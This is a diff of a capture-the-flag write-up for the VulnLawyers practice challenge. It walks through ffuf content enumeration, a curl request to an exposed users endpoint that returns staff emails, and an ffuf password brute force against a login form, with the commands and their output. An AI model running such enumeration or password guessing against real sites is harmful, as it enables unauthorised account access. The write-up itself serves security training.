@@ -27,11 +27,9 @@ just the best feeling, so please give it another go when you're reading this!
 I'll not include any of the flags to avoid people simply copying and pasting
 them.
 
-With the mommy'ing out of the way, let's get pwning.
-
-> At the time of writing, I have already completed the challenge and I'm not
-> sure what number was associated with which flag (as the website does not allow
-> me to re-enter flags). These are the flags in the order I found them.
+Another note, I create these writeups as if speaking to myself. If my manner of
+speaking seems a bit odd, you try talking to yourself without sounding
+a little odd.
 
 ## Flags
 
@@ -74,6 +72,7 @@ $ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: c
 
 [...]
 ________________________________________________
+
 css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
 denied                  [Status: 401, Size: 1020, Words: 178, Lines: 30, Duration: 15ms]
 images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 15ms]
@@ -109,10 +108,93 @@ Well, would you look at that, a flag and a hidden endpoint :eyes:! Christmas
 came early this year.
 
 Opening the URL `http://www.vulnlawyers.co.uk/lawyers-only` will bring us to a
-login screen. Now the fun stuff can begin!
+login screen. Now we can start gaining some unrequisited privileges.
 
-### A Bit of This and A Bit of That (Enumeration/Exploitation)
+### Pipelining (Enumeration)
 
-The current goal is to log in, but we lack any user data.
+The current goal is to log in, but we lack any user data. Thinking back, the
+`data.vulnlawyers.co.uk` probably contains some of that precious user data.
+Actually, we have yet to enumerate files and folders. Not you tho, no, while we
+were trying to figure out how to access the login page, you have of course
+started `ffuf`'ing (that's not a word, but it should be) the domain. If you
+haven't, keep in mind that reconnaissance can sometimes take a long time.
+Minimize waiting and keep that noggin of yours churning.
+
+```
+$ ffuf -w ~/Documents/Playground/wordlists/content.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=<your_ctf_cookie>" -u http://data.vulnlawyers.co.uk/FUZZ
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+[...]
+________________________________________________
+users                   [Status: 200, Size: 406, Words: 6, Lines: 1, Duration: 21ms]
+```
+
+'Lo and behold, an endpoint called `/users`. Let's employ `curl` and see what it
+holds.
+```
+curl data.vulnlawyers.co.uk/users -H "Cooki e: ctfchallenge=<your_ctf_cookie>"
+{
+  "users": [
+    {
+      "name": "Yusef Mcclain",
+      "email": "yusef.mcclain@vulnlawyers.co.uk"
+    },
+    {
+      "name": "Shayne Cairns",
+      "email": "shayne.cairns@vulnlawyers.co.uk"
+    },
+    {
+      "name": "Eisa Evans",
+      "email": "eisa.evans@vulnlawyers.co.uk"
+    },
+    {
+      "name": "Jaskaran Lowe",
+      "email": "jaskaran.lowe@vulnlawyers.co.uk"
+    },
+    {
+      "name": "Marsha Blankenship",
+      "email": "marsha.blankenship@vulnlawyers.co.uk"
+    }
+  ],
+  "flag": "[^FLAG^https://media.giphy.com/media/26gs6vEzlpaxuYgso/giphy.gif^FLAG^]"
+}
+```
+
+And that's our third flag. Onto exploitation!
+
+### Higher and Higher (Exploitation)
+
+With a bit of luck, the attorneys are not technically inclined and use simple
+passwords. After a bit of trail-and-error, we stumble upon Jaskaran Lowe.
+
+```
+ffuf -w ~/Documents/Playground/wordlists/passwords.txt -t 1 -p 0.1 -H "Cookie: ctfchallenge=<your_ctf_cookie>" -u http://www.vulnlawyers.co.uk/lawyers-only-login -H "Content-Type: applicati
+on/x-www-form-urlencoded" -d 'email=jaskaran.lowe@vulnlawyers.co.uk&password=FUZZ' -fr "Invalid"
+
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+[...]
+________________________________________________
+
+summer                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
+```
+
+Logging in using browser gives us some info regarding a case, but more
+importantly, the next flag!
+
+### Some More Digging (Exploitation)
 
 [^1]: [302 Found](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)
